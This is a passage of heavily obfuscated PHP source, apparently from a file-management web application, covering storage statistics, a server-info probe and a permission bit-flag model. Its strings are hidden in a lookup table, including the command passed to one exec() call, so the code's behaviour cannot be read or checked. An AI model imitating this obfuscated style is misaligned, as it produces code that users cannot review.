(!$Â³ÏĞ­) { return $Â³ÏĞ­; } if (is_array($Â³ÏĞ­[$°¾ú‚Ö¦[1474]])) { $Ùñë³Ô = Action($°¾ú‚Ö¦[1483])->parsePathChildren($Â³ÏĞ­[$°¾ú‚Ö¦[1474]], array($°¾ú‚Ö¦[507] => $òÚ¹¼Ü)); $Â³ÏĞ­[$°¾ú‚Ö¦[1474]] = Action($°¾ú‚Ö¦[1294])->shareItemInfo($Ùñë³Ô); } foreach ($Â³ÏĞ­ as $¸Æ§²‚± => $ŠéËö¦) { if (!in_array($¸Æ§²‚±, array($°¾ú‚Ö¦[86], $°¾ú‚Ö¦[85]))) { continue; } foreach ($ŠéËö¦ as $¬¥®µôÑ => $Ùñë³Ô) { $Ùñë³Ô = Action($°¾ú‚Ö¦[1483])->parsePathChildren($Ùñë³Ô, array($°¾ú‚Ö¦[507] => $òÚ¹¼Ü)); $Â³ÏĞ­[$¸Æ§²‚±][$¬¥®µôÑ] = Action($°¾ú‚Ö¦[1294])->shareItemInfo($Ùñë³Ô); } } return $Â³ÏĞ­; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($ï¿™¦¤€) { parent::__construct($ï¿™¦¤€); $this->setSignVersion($_SERVER[åÄ¼Ùßš][250]); } } goto bŠğŸèàãè; AÀÓÁâË„Ş: class AnalysisModel extends ModelBaseLight { public function init($Ï×“ö™) { $Íúåìë =& $_SERVER[åÄ¼Ùßš]; $ÎïÉ·ø¸ = array($Íúåìë[678] => array($Íúåìë[33] => $Íúåìë[1947], $Íúåìë[353] => array($Íúåìë[285], $Íúåìë[859], $Íúåìë[1948], $Íúåìë[1949])), $Íúåìë[1950] => array($Íúåìë[33] => $Íúåìë[1951], $Íúåìë[353] => array($Íúåìë[285], $Íúåìë[857], $Íúåìë[1952], $Íúåìë[1953], $Íúåìë[1954]))); if (!isset($ÎïÉ·ø¸[$Ï×“ö™])) { return !1; } $this->optionType = $ÎïÉ·ø¸[$Ï×“ö™][$Íúåìë[33]]; $this->field = $ÎïÉ·ø¸[$Ï×“ö™][$Íúåìë[353]]; return !0; } public function listData($ÙŞß²–² = false, $ĞÆ›Ÿ¦š = "\x6d\x6f\x64\151\x66\x79\124\x69\155\x65", $€ô İ‡‘ = false) { return parent::listData($ÙŞß²–², $ĞÆ›Ÿ¦š, $€ô İ‡‘); } public function trendList($«ˆ¶ÛÓ) { $©Ñé±ô =& $_SERVER[åÄ¼Ùßš]; $‚ããı– = $this->listData(); if ($‚ããı–) { $úáÖºÏˆ = end($‚ããı–); $Ş’¥¼ÖÜ = date($©Ñé±ô[1955], strtotime($©Ñé±ô[1956])); if ($úáÖºÏˆ[$©Ñé±ô[285]] == $Ş’¥¼ÖÜ) { return $‚ããı–; } $à¹ıÛ“ö = strtotime($úáÖºÏˆ[$©Ñé±ô[285]]); } if (!isset($à¹ıÛ“ö)) { $å­–åò· = $«ˆ¶ÛÓ == $©Ñé±ô[678] ? $©Ñé±ô[610] : $©Ñé±ô[926]; $à¹ıÛ“ö = Model($å­–åò·)->min($©Ñé±ô[234]); } $äø™æî¹ = $©Ñé±ô[1957] . ucfirst($«ˆ¶ÛÓ); $Ñä¯Ô½½ = $this->dateList($à¹ıÛ“ö); foreach ($Ñä¯Ô½½ as $Ş’¥¼ÖÜ) { $this->{$äø™æî¹}($Ş’¥¼ÖÜ); } return $this->listData(); } private function dateList($Ø«Ôøû¡) { $çŠòÎ»— =& $_SERVER[åÄ¼Ùßš]; $íŸŞ¬‰Â = $Ø«Ôøû¡; $šĞ¡‰± = strtotime($çŠòÎ»—[1956]); $à÷Ü€ª = array(); while ($íŸŞ¬‰Â <= $šĞ¡‰±) { $à÷Ü€ª[] = date($çŠòÎ»—[1955], $íŸŞ¬‰Â); $íŸŞ¬‰Â = strtotime($çŠòÎ»—[1958], $íŸŞ¬‰Â); } return $à÷Ü€ª; } public function _recordUser($ıªÙ¦‘› = '') { $¡Ş¤‰æÖ =& $_SERVER[åÄ¼Ùßš]; $–ºÂÃ« = strtotime(date($¡Ş¤‰æÖ[1959], strtotime($ıªÙ¦‘›))); $ÀÁ°»‚ı = strtotime(date($¡Ş¤‰æÖ[1960], strtotime($ıªÙ¦‘›))); $¨çˆãÉó = array($¡Ş¤‰æÖ[234] => array($¡Ş¤‰æÖ[1121], $ÀÁ°»‚ı)); $öÌ‹üƒ = Model($¡Ş¤‰æÖ[610])->where($¨çˆãÉó)->count($¡Ş¤‰æÖ[1817]); $¨çˆãÉó[$¡Ş¤‰æÖ[234]] = array($¡Ş¤‰æÖ[410], array($–ºÂÃ«, $ÀÁ°»‚ı)); $Òæä¨Òã = Model($¡Ş¤‰æÖ[610])->where($¨çˆãÉó)->count($¡Ş¤‰æÖ[1817]); $¨çˆãÉó[$¡Ş¤‰æÖ[33]] = $¡Ş¤‰æÖ[1961]; $î±Û©Ù¯ = Model($¡Ş¤‰æÖ[1962])->where($¨çˆãÉó)->count($¡Ş¤‰æÖ[1963]); $»ê¨·Ù¨ = array($¡Ş¤‰æÖ[285] => $ıªÙ¦‘›, $¡Ş¤‰æÖ[859] => (int) $öÌ‹üƒ, $¡Ş¤‰æÖ[1948] => (int) $Òæä¨Òã, $¡Ş¤‰æÖ[1949] => (int) $î±Û©Ù¯); return $this->insert($»ê¨·Ù¨); } public function _recordStore($›¯­æïœ = '') { $Ğ¬ı³¶· =& $_SERVER[åÄ¼Ùßš]; $¹ä±ñõ¦ = strtotime(date($Ğ¬ı³¶·[1960], strtotime($›¯­æïœ))); $²Ö¾Ÿ±ƒ = array($Ğ¬ı³¶·[234] => array($Ğ¬ı³¶·[1121], $¹ä±ñõ¦)); $ÕÄŒ„ñğ = Model($Ğ¬ı³¶·[557])->where($²Ö¾Ÿ±ƒ)->sum($Ğ¬ı³¶·[79]); $²Ö¾Ÿ±ƒ[$Ğ¬ı³¶·[497]] = 0; $ÓÜ­‘ğƒ = Model($Ğ¬ı³¶·[926])->where($²Ö¾Ÿ±ƒ)->sum($Ğ¬ı³¶·[79]); $²Ö¾Ÿ±ƒ[$Ğ¬ı³¶·[191]] = 1; $’¨â—ªø = Model($Ğ¬ı³¶·[926])->where($²Ö¾Ÿ±ƒ)->sum($Ğ¬ı³¶·[79]); $²Ö¾Ÿ±ƒ[$Ğ¬ı³¶·[191]] = 2; $»µºò™ = Model($Ğ¬ı³¶·[926])->where($²Ö¾Ÿ±ƒ)->sum($Ğ¬ı³¶·[79]); $¤ïûéšÈ = array($Ğ¬ı³¶·[285] => $›¯­æïœ, $Ğ¬ı³¶·[857] => (int) $ÓÜ­‘ğƒ, $Ğ¬ı³¶·[1952] => (int) $ÕÄŒ„ñğ, $Ğ¬ı³¶·[1953] => (int) $’¨â—ªø, $Ğ¬ı³¶·[1954] => (int) $»µºò™); return $this->insert($¤ïûéšÈ); } public function trend($¨ü‡İ÷, $¨òË¹¼) { $˜Á’ßÆ =& $_SERVER[åÄ¼Ùßš]; if (!$this->init($¨ü‡İ÷)) { return !1; } $Ôö·ò… = $this->trendList($¨ü‡İ÷); if ($Ôö·ò… && $¨òË¹¼ != $˜Á’ßÆ[1789]) { $âƒïğ¨ = $Ôö·ò…[0][$˜Á’ßÆ[285]]; $Ìİ°ÆãÚ = $this->validDate($¨òË¹¼, $âƒïğ¨); $«‚Ï¶û¯ = array(); $”¸ø¢ƒ = array_to_keyvalue($Ôö·ò…, $˜Á’ßÆ[285]); foreach ($Ìİ°ÆãÚ as $óÈÀúù÷) { if (isset($”¸ø¢ƒ[$óÈÀúù÷])) { $ËÍ£²½ = $”¸ø¢ƒ[$óÈÀúù÷]; } else { $ËÍ£²½ = end($Ôö·ò…); $ËÍ£²½[$˜Á’ßÆ[285]] = $óÈÀúù÷; if ($¨ü‡İ÷ == $˜Á’ßÆ[678]) { $ËÍ£²½[$˜Á’ßÆ[1948]] = $ËÍ£²½[$˜Á’ßÆ[1949]] = 0; } } $«‚Ï¶û¯[] = $ËÍ£²½; } $Ôö·ò… = $«‚Ï¶û¯; } $Õ®ÒÌÜ = array($˜Á’ßÆ[678] => array($˜Á’ßÆ[859] => LNG($˜Á’ßÆ[1964]), $˜Á’ßÆ[1948] => LNG($˜Á’ßÆ[1965]), $˜Á’ßÆ[1949] => LNG($˜Á’ßÆ[1966])), $˜Á’ßÆ[1950] => array($˜Á’ßÆ[857] => LNG($˜Á’ßÆ[1967]), $˜Á’ßÆ[1952] => LNG($˜Á’ßÆ[1968]), $˜Á’ßÆ[1953] => LNG($˜Á’ßÆ[1969]), $˜Á’ßÆ[1954] => LNG($˜Á’ßÆ[1970]))); $ğï–ÔáØ = array($˜Á’ßÆ[678] => $˜Á’ßÆ[1971], $˜Á’ßÆ[1950] => $˜Á’ßÆ[79]); if (empty($Ôö·ò…)) { $óÈÀúù÷ = date($˜Á’ßÆ[1955], strtotime($˜Á’ßÆ[1956])); $Œéä’İÖ = array($˜Á’ßÆ[285] => $óÈÀúù÷); foreach ($Õ®ÒÌÜ[$¨ü‡İ÷] as $ß¬ï®æ => $äìÅšŒø) { $Œéä’İÖ[$ß¬ï®æ] = 0; } $Ôö·ò…[] = $Œéä’İÖ; } $ğ‡¹ñ³¢ = array(); foreach ($Ôö·ò… as $äìÅšŒø) { if ($¨ü‡İ÷ == $˜Á’ßÆ[1950] && $äìÅšŒø[$˜Á’ßÆ[1952]] > $äìÅšŒø[$˜Á’ßÆ[857]]) { $äìÅšŒø[$˜Á’ßÆ[1952]] = $äìÅšŒø[$˜Á’ßÆ[857]]; } foreach ($Õ®ÒÌÜ[$¨ü‡İ÷] as $ß¬ï®æ => $§ºÔıÓé) { $ËÍ£²½ = array($˜Á’ßÆ[285] => $äìÅšŒø[$˜Á’ßÆ[285]], $˜Á’ßÆ[1704] => $§ºÔıÓé); $ËÍ£²½[$ğï–ÔáØ[$¨ü‡İ÷]] = isset($äìÅšŒø[$ß¬ï®æ]) ? $äìÅšŒø[$ß¬ï®æ] : 0; $ğ‡¹ñ³¢[] = $ËÍ£²½; } } return $ğ‡¹ñ³¢; } public function validDate($›ÒøİÎï, $ê» ²©À) { $¯î¢¥ Ñ =& $_SERVER[åÄ¼Ùßš]; $˜ºù”ıæ = date($¯î¢¥ Ñ[1955], strtotime($¯î¢¥ Ñ[1956])); $…ò‰ûå = array($˜ºù”ıæ); switch ($›ÒøİÎï) { case $¯î¢¥ Ñ[1796]: $Û¦ôœ˜İ = mktime(0, 0, 0, date($¯î¢¥ Ñ[1972]), date($¯î¢¥ Ñ[1497]) - date($¯î¢¥ Ñ[1586]) + 7 - 7, date($¯î¢¥ Ñ[1973])); $ÆÔßÛ‚© = 0; do { $È”¡û¦Ï = date($¯î¢¥ Ñ[1955], $Û¦ôœ˜İ - 3600 * 24 * 7 * $ÆÔßÛ‚©); $…ò‰ûå[] = $È”¡û¦Ï; $ÆÔßÛ‚©++; } while ($ê» ²©À < $È”¡û¦Ï); break; case $¯î¢¥ Ñ[1794]: $ÆÔßÛ‚© = 1; do { $ë…Áçğ— = date($¯î¢¥ Ñ[1974], strtotime("\55\40{$ÆÔßÛ‚©}\x20\155\157\156\164\x68\x73")); $…ò‰ûå[] = $ë…Áçğ—; $ÆÔßÛ‚©++; } while ($ê» ²©À < $ë…Áçğ—); break; case $¯î¢¥ Ñ[1975]: $ µŠ‰› = (int) date($¯î¢¥ Ñ[1973], strtotime($ê» ²©À)); $Æ¦î†‰Ú = (int) date($¯î¢¥ Ñ[1973]); if ($ µŠ‰› >= $Æ¦î†‰Ú) { break; } for ($ µŠ‰›; $ µŠ‰› < $Æ¦î†‰Ú; $ µŠ‰›++) { $…ò‰ûå[] = $ µŠ‰› . $¯î¢¥ Ñ[1976]; } break; default: break; } if ($ê» ²©À > end($…ò‰ûå)) { array_pop($…ò‰ûå); } sort($…ò‰ûå); return $…ò‰ûå; } public function listTable($•øô–‚) { $€¿ïÔş¦ = ucfirst($•øô–‚); return Model($€¿ïÔş¦)->listData(); } public function option($Ç¡çŸæÚ) { $·Êë¹ı = $_SERVER[åÄ¼Ùßš][1977] . ucfirst($Ç¡çŸæÚ); return $this->{$·Êë¹ı}(); } private function optionUser() { $ëà“” ¥ =& $_SERVER[åÄ¼Ùßš]; $¼®û­ó = Model($ëà“” ¥[610])->count($ëà“” ¥[1817]); $¸¶Æ×æ = Model($ëà“” ¥[610])->where($ëà“” ¥[1978])->count($ëà“” ¥[1817]); $ø…¿Öƒ = intval($GLOBALS[$ëà“” ¥[6]][$ëà“” ¥[426]][$ëà“” ¥[1762]]) / 3600; $Ä¹å™Ñ = strtotime("\55{$ø…¿Öƒ}\x20\x68\x6f\x75\x72\x73"); $°øƒÆëà = strtotime(date($ëà“” ¥[1959])); if ($Ä¹å™Ñ < $°øƒÆëà) { $Ä¹å™Ñ = $°øƒÆëà; } $‚Ïü§‰ = array($ëà“” ¥[1979] => array($ëà“” ¥[1122], $Ä¹å™Ñ)); $ñäÎòœ = (int) Model($ëà“” ¥[610])->where($‚Ïü§‰)->count($ëà“” ¥[1817]); if (!$ñäÎòœ) { $ñäÎòœ = 1; } $‚Ïü§‰ = array($ëà“” ¥[1979] => array($ëà“” ¥[1122], $°øƒÆëà)); $Ğ—·Ï»¡ = Model($ëà“” ¥[610])->where($‚Ïü§‰)->count($ëà“” ¥[1817]); return array($ëà“” ¥[852] => (int) $¼®û­ó, $ëà“” ¥[1980] => (int) ($¼®û­ó - $¸¶Æ×æ), $ëà“” ¥[1981] => (int) $¸¶Æ×æ, $ëà“” ¥[1982] => (int) $Ğ—·Ï»¡, $ëà“” ¥[1983] => $ñäÎòœ); } private function optionFile() { $”¢ÂÍ‚× =& $_SERVER[åÄ¼Ùßš]; $âˆÆöñ“ = $this->sourceSize(); $†èÂÄ™° = $âˆÆöñ“[$”¢ÂÍ‚×[79]]; $¹µ¤™×Ó = $âˆÆöñ“[$”¢ÂÍ‚×[1952]]; $¹¾ƒ†ĞØ = Model($”¢ÂÍ‚×[926])->where(array($”¢ÂÍ‚×[497] => 0))->count($”¢ÂÍ‚×[194]); $ŞœšØÌ½ = array($”¢ÂÍ‚×[497] => 0, $”¢ÂÍ‚×[234] => array($”¢ÂÍ‚×[1122], strtotime(date($”¢ÂÍ‚×[1959])))); $ËøÏ š = Model($”¢ÂÍ‚×[926])->where($ŞœšØÌ½)->sum($”¢ÂÍ‚×[79]); $ê®Ó˜íğ = Model($”¢ÂÍ‚×[926])->where($ŞœšØÌ½)->count($”¢ÂÍ‚×[194]); return array($”¢ÂÍ‚×[857] => $†èÂÄ™°, $”¢ÂÍ‚×[1952] => $¹µ¤™×Ó, $”¢ÂÍ‚×[1984] => $†èÂÄ™° - $¹µ¤™×Ó, $”¢ÂÍ‚×[1985] => (int) $ËøÏ š, $”¢ÂÍ‚×[859] => (int) $¹¾ƒ†ĞØ, $”¢ÂÍ‚×[1986] => (int) $ê®Ó˜íğ); } private function optionAccess() { $Õ€‘Îá =& $_SERVER[åÄ¼Ùßš]; return array($Õ€‘Îá[852] => $this->typeLogCnt(), $Õ€‘Îá[110] => $this->typeLogCnt($Õ€‘Îá[110]), $Õ€‘Îá[536] => $this->typeLogCnt($Õ€‘Îá[536]), $Õ€‘Îá[1265] => $this->typeLogCnt($Õ€‘Îá[1265]), $Õ€‘Îá[1987] => $this->typeLogCnt($Õ€‘Îá[1987]), $Õ€‘Îá[678] => $this->typeLogCnt($Õ€‘Îá[12], $Õ€‘Îá[1963])); } private function typeLogCnt($ù»ËôÀ = '', $áÙœ¢Œœ = "\151\144") { $ìÔª“¹ =& $_SERVER[åÄ¼Ùßš]; $äßõÈ´ = array($ìÔª“¹[110] => array($ìÔª“¹[1988], $ìÔª“¹[1989]), $ìÔª“¹[536] => array($ìÔª“¹[1990], $ìÔª“¹[1991]), $ìÔª“¹[1265] => array($ìÔª“¹[1992], $ìÔª“¹[1993], $ìÔª“¹[1994]), $ìÔª“¹[1987] => array($ìÔª“¹[1995], $ìÔª“¹[1996]), $ìÔª“¹[1997] => array($ìÔª“¹[1998], $ìÔª“¹[1999], $ìÔª“¹[2000])); $àœÄ»Õà = strtotime(date($ìÔª“¹[1959])); $é†àèŸ = array($ìÔª“¹[234] => array($ìÔª“¹[1122], $àœÄ»Õà)); if ($ù»ËôÀ) { $é†àèŸ[$ìÔª“¹[33]] = array($ìÔª“¹[7], $äßõÈ´[$ù»ËôÀ]); } $Ù£÷ Õ = Model($ìÔª“¹[1962])->where($é†àèŸ)->count($áÙœ¢Œœ); return (int) $Ù£÷ Õ; } private function optionServer() { $¡İ‡ÏËæ =& $_SERVER[åÄ¼Ùßš]; $®¯¡°ŒÚ = $this->diskDriver(); $Ú“ØùÂ = KodIO::defaultDriver(); $Ğ¤¤Ìßº = array($¡İ‡ÏËæ[919] => $Ú“ØùÂ[$¡İ‡ÏËæ[484]]); $å…Û«ì‡ = Model($¡İ‡ÏËæ[557])->where($Ğ¤¤Ìßº)->sum($¡İ‡ÏËæ[79]); $«šıÈì§ = explode($¡İ‡ÏËæ[53], $_SERVER[$¡İ‡ÏËæ[147]]); $¸ù™›‡ = $«šıÈì§[0]; $şÖº  = $GLOBALS[$¡İ‡ÏËæ[6]][$¡İ‡ÏËæ[21]]; $è¨ÈÇ¬ñ = $şÖº [$¡İ‡ÏËæ[1084]]; if ($è¨ÈÇ¬ñ == $¡İ‡ÏËæ[1072]) { $Ç€‰§¦® = explode($¡İ‡ÏËæ[1406], $şÖº [$¡İ‡ÏËæ[1083]]); $è¨ÈÇ¬ñ = $Ç€‰§¦®[0]; } if ($è¨ÈÇ¬ñ == $¡İ‡ÏËæ[1020] || $è¨ÈÇ¬ñ == $¡İ‡ÏËæ[904]) { $ÍÖ¬ØıĞ = Model()->db()->query($¡İ‡ÏËæ[2001]); $îßšÇËº = $ÍÖ¬ØıĞ[0] && isset($ÍÖ¬ØıĞ[0][$¡İ‡ÏËæ[1703]]) ? $ÍÖ¬ØıĞ[0][$¡İ‡ÏËæ[1703]] : 0; $è¨ÈÇ¬ñ = $¡İ‡ÏËæ[2002] . ($îßšÇËº ? $¡İ‡ÏËæ[8] . $îßšÇËº : $¡İ‡ÏËæ[12]); } $·ûâûåÄ = $GLOBALS[$¡İ‡ÏËæ[6]][$¡İ‡ÏËæ[426]][$¡İ‡ÏËæ[928]]; return array($¡İ‡ÏËæ[2003] => $®¯¡°ŒÚ ? $®¯¡°ŒÚ[$¡İ‡ÏËæ[2004]] : 0, $¡İ‡ÏËæ[2005] => $®¯¡°ŒÚ ? $®¯¡°ŒÚ[$¡İ‡ÏËæ[2006]] : 0, $¡İ‡ÏËæ[2007] => (int) $Ú“ØùÂ[$¡İ‡ÏËæ[2004]] * 1024 * 1024 * 1024, $¡İ‡ÏËæ[2008] => (int) $å…Û«ì‡, $¡İ‡ÏËæ[2009] => ucfirst($¸ù™›‡), $¡İ‡ÏËæ[2010] => $¡İ‡ÏËæ[2011] . PHP_VERSION, $¡İ‡ÏËæ[2012] => phpBuild64() ? 64 : 32, $¡İ‡ÏËæ[851] => str_replace($¡İ‡ÏËæ[1247], $¡İ‡ÏËæ[1100], $è¨ÈÇ¬ñ), $¡İ‡ÏËæ[426] => ucfirst($·ûâûåÄ), $¡İ‡ÏËæ[32] => $_SERVER[$¡İ‡ÏËæ[2013]]); } private function diskDriver() { $úŠò‡µ˜ =& $_SERVER[åÄ¼Ùßš]; $€íëëÍ¦ = $úŠò‡µ˜[8]; $…Ş’íü¥ = $GLOBALS[$úŠò‡µ˜[6]][$úŠò‡µ˜[1430]] == $úŠò‡µ˜[1431]; if ($…Ş’íü¥) { $€íëëÍ¦ = $úŠò‡µ˜[2014]; if (function_exists($úŠò‡µ˜[2015])) { exec($úŠò‡µ˜[2016], $«¡¶¦Ğã); $€íëëÍ¦ = $«¡¶¦Ğã[1] . $úŠò‡µ˜[8]; } } if (!file_exists($€íëëÍ¦)) { return; } if (!function_exists($úŠò‡µ˜[2017])) { return; } $¶Ğß÷ƒ® = @disk_total_space($€íëëÍ¦); $ÌÀ¯­ë = $¶Ğß÷ƒ® - @disk_free_space($€íëëÍ¦); return array($úŠò‡µ˜[2004] => $¶Ğß÷ƒ®, $úŠò‡µ˜[2006] => $ÌÀ¯­ë); } public function fileChart($ó¾ôˆ¶Â) { $Øş›ûÃŸ =& $_SERVER[åÄ¼Ùßš]; if (isset($ó¾ôˆ¶Â[$Øş›ûÃŸ[1817]])) { return Model($Øş›ûÃŸ[926])->userFileTypeProfile($ó¾ôˆ¶Â[$Øş›ûÃŸ[1817]]); } if (isset($ó¾ôˆ¶Â[$Øş›ûÃŸ[1428]])) { return Model($Øş›ûÃŸ[926])->groupFileTypeProfile($ó¾ôˆ¶Â[$Øş›ûÃŸ[1428]]); } $şÜ´õ¥ = $this->sourceSize(); $ñŸöâ¬¨ = array($Øş›ûÃŸ[193] => 0, $Øş›ûÃŸ[191] => 1); $ÉŠ¹Èä = Model($Øş›ûÃŸ[926])->where($ñŸöâ¬¨)->sum($Øş›ûÃŸ[79]); $ñŸöâ¬¨[$Øş›ûÃŸ[191]] = 2; $éŠ´° = Model($Øş›ûÃŸ[926])->where($ñŸöâ¬¨)->sum($Øş›ûÃŸ[79]); return array($Øş›ûÃŸ[857] => $şÜ´õ¥[$Øş›ûÃŸ[79]], $Øş›ûÃŸ[1952] => $şÜ´õ¥[$Øş›ûÃŸ[1952]], $Øş›ûÃŸ[1953] => (int) $ÉŠ¹Èä, $Øş›ûÃŸ[1954] => (int) $éŠ´°); } private function sourceSize() { $ÌÂº¤û’ =& $_SERVER[åÄ¼Ùßš]; $î—ÊøÔ = Model($ÌÂº¤û’[926])->where(array($ÌÂº¤û’[497] => 0))->sum($ÌÂº¤û’[79]); $ó°Òèòå = Model($ÌÂº¤û’[557])->sum($ÌÂº¤û’[79]); if ($ó°Òèòå > $î—ÊøÔ) { $ó°Òèòå = $î—ÊøÔ; } return array($ÌÂº¤û’[79] => (int) $î—ÊøÔ, $ÌÂº¤û’[1952] => (int) $ó°Òèòå); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $£ÏÊÒ¹ =& $_SERVER[åÄ¼Ùßš]; $œ­¼‡´Ú = array(array($£ÏÊÒ¹[506] => LNG($£ÏÊÒ¹[2018]), $£ÏÊÒ¹[2019] => $£ÏÊÒ¹[2020], $£ÏÊÒ¹[2021] => 1, $£ÏÊÒ¹[2022] => 1, $£ÏÊÒ¹[2023] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($£ÏÊÒ¹[506] => LNG($£ÏÊÒ¹[2024]), $£ÏÊÒ¹[2019] => $£ÏÊÒ¹[2025], $£ÏÊÒ¹[2021] => 2, $£ÏÊÒ¹[2022] => 1, $£ÏÊÒ¹[2023] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($£ÏÊÒ¹[506] => LNG($£ÏÊÒ¹[2026]), $£ÏÊÒ¹[2019] => $£ÏÊÒ¹[2027], $£ÏÊÒ¹[2021] => 3, $£ÏÊÒ¹[2022] => 1, $£ÏÊÒ¹[2023] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($£ÏÊÒ¹[506] => LNG($£ÏÊÒ¹[2028]), $£ÏÊÒ¹[2019] => $£ÏÊÒ¹[2029], $£ÏÊÒ¹[2021] => 4, $£ÏÊÒ¹[2022] => 1, $£ÏÊÒ¹[2023] => self::AUTH_SHOW | self::AUTH_VIEW), array($£ÏÊÒ¹[506] => LNG($£ÏÊÒ¹[2030]), $£ÏÊÒ¹[2019] => $£ÏÊÒ¹[2031], $£ÏÊÒ¹[2021] => 5, $£ÏÊÒ¹[2022] => 1, $£ÏÊÒ¹[2023] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($£ÏÊÒ¹[506] => LNG($£ÏÊÒ¹[2032]), $£ÏÊÒ¹[2019] => $£ÏÊÒ¹[2033], $£ÏÊÒ¹[2021] => 6, $£ÏÊÒ¹[2022] => 1, $£ÏÊÒ¹[2023] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($£ÏÊÒ¹[506] => LNG($£ÏÊÒ¹[2034]), $£ÏÊÒ¹[2019] => $£ÏÊÒ¹[2035], $£ÏÊÒ¹[2021] => 7, $£ÏÊÒ¹[2022] => 1, $£ÏÊÒ¹[2023] => 0)); return $œ­¼‡´Ú; } public static function authCheck($†í¬Ÿ‡¿, $Ê…íğ®Ü) { $ñÎØÉØï =& $_SERVER[åÄ¼Ùßš]; $†í¬Ÿ‡¿ = intval($†í¬Ÿ‡¿); if (KodUser::isRoot() && $GLOBALS[$ñÎØÉØï[6]][$ñÎØÉØï[2036]]) { return !0; } if ($†í¬Ÿ‡¿ <= 0) { return !1; } if (($†í¬Ÿ‡¿ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($†í¬Ÿ‡¿ & $Ê…íğ®Ü); } public static function authCheckShow($â–ñôç) { return self::authCheck($â–ñôç, self::AUTH_SHOW); } public static function authCheckView($îòŠğ€) { return self::authCheck($îòŠğ€, self::AUTH_VIEW); } public static function authCheckDownload($Ë”š¾æ¾) { return self::authCheck($Ë”š¾æ¾, self::AUTH_DOWNLOAD); } public static function authCheckUpload($äÏí¯İ) { return self::authCheck($äÏí¯İ, self::AUTH_UPLOAD); } public static function authCheckEdit($º£€æ¥¹) { return self::authCheck($º£€æ¥¹, self::AUTH_EDIT); } public static function authCheckRemove($İ¡½ê°È) { return self::authCheck($İ¡½ê°È, self::AUTH_REMOVE); } public static function authCheckShare($°Ã¸Í…”) { return self::authCheck($°Ã¸Í…”, self::AUTH_SHARE); } public static function authCheckComment($·«Åº¼ä) { return self::authCheck($·«Åº¼ä, self::AUTH_COMMENT); } public static function authCheckEvent($à¯ŸÂŞ°) { return self::authCheck($à¯ŸÂŞ°, self::AUTH_EVENT); } public static function authCheckRoot($¼ÒÕª»ı) { return self::authCheck($¼ÒÕª»ı, self::AUTH_ROOT); } public static function authCheckAction($ë¶ˆŒ, $­èÁ²”) { $Ä‰ª”™€ =& $_SERVER[åÄ¼Ùßš]; $Ò‰Ë¨â = array($Ä‰ª”™€[2037] => self::AUTH_VIEW, $Ä‰ª”™€[1317] => self::AUTH_DOWNLOAD, $Ä‰ª”™€[110] => self::AUTH_UPLOAD, $Ä‰ª”™€[1987] => self::AUTH_EDIT, $Ä‰ª”™€[1265] => self::AUTH_REMOVE, $Ä‰ª”™€[1997] => self::AUTH_SHARE, $Ä‰ª”™€[431] => self::AUTH_COMMENT, $Ä‰ª”™€[1804] => self::AUTH_EVENT, $Ä‰ª”™€[2038] => self::AUTH_ROOT); if (!isset($Ò‰Ë¨â[$­èÁ²”])) { return; } $ô¨ÕÑâ = $Ò‰Ë¨â[$­èÁ²”]; $ë¶ˆŒ = intval($ë¶ˆŒ); if ($ë¶ˆŒ <= 0) { return !1; } if (($ë¶ˆŒ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ë¶ˆŒ & $ô¨ÕÑâ); } public static function authDisable($ˆâš§öÜ, $”Áè‚úë) { if (intval($ˆâš§öÜ) <= 0) { return 0; } return intval($ˆâš§öÜ) & ~$”Áè‚úë; } public $optionType = "\x53\171\x73\164\145\155\56\x73\x6f\x75\162\x63\145\101\x75\x74\x68\114\151\x73\x74"; public $field = array("\x6e\141\155\145", "\x61\165\x74\x68", "\154\x61\x62\145\154", "\x64\151\163\x70\x6c\141\171", "\163\171\163\164\x65\x6d", "\163\x6f\x72\x74"); public function initData() { $ôÂÁàÅ = $this->authDefault(); foreach ($ôÂÁàÅ as $Úù‚·´¾) { $this->add($Úù‚·´¾); } } public function findAuth($¡’ï“ôÄ, $½¿Æùâê) { $»­ÀÇİ³ =& $_SERVER[åÄ¼Ùßš]; $ã´Í¶…˜ = parent::listData(); foreach ($ã´Í¶…˜ as $è¯ıÑœ§) { $Ú”Õú¨ = intval($è¯ıÑœ§[$»­ÀÇİ³[499]]); if ($Ú”Õú¨ <= 0 || $è¯ıÑœ§[$»­ÀÇİ³[2039]] == 0) { continue; } if (($Ú”Õú¨ & $¡’ï“ôÄ) != $¡’ï“ôÄ) { continue; } if (($Ú”Õú¨ & $½¿Æùâê) != 0) { continue; } return $è¯ıÑœ§[$»­ÀÇİ³[484]]; } return !1; } public function findAuthMax($ßæ°±‘æ, $á„©áë) { $İûğİ‹ =& $_SERVER[åÄ¼Ùßš]; $õÖÑÚšã = !1; $ÜÀê€«¨ = parent::listData(); foreach ($ÜÀê€«¨ as $úˆÈéäá) { $İ¥ôöØ = intval($úˆÈéäá[$İûğİ‹[499]]); if ($İ¥ôöØ <= 0 || $úˆÈéäá[$İûğİ‹[2039]] == 0) { continue; } if (($İ¥ôöØ & 